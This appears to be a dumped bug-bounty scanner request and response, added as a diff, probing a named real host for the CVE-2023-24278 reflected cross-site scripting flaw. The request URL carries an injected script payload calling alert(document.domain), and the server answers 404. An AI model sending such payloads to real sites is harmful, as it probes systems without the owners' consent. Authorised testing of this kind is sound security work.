@@ -1,0 +1,30 @@
+[CVE-2023-24278] Dumped HTTP request for https://techsolutions.bitpanda.com/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small
+
+
+GET /squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2023-24278] Dumped HTTP response https://techsolutions.bitpanda.com/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 5e79d089f5701b7938b599fdf4db1b52.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: l3AbHbZmom8aiYsaj8s1mFlosGP30sCCZZ25Lk2nHnROfCbReytx9g==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: 0PZHxxG9junFhbrDbo4NKVoZl8Pc7vFQAQeVzbAkaLMV9W8b4hxAypjlGfXtCWKvHwbVyrwIjgI=
+X-Amz-Request-Id: VE5VDKH6KWCEQSFX
+X-Cache: Error from cloudfront
+
+Not Found
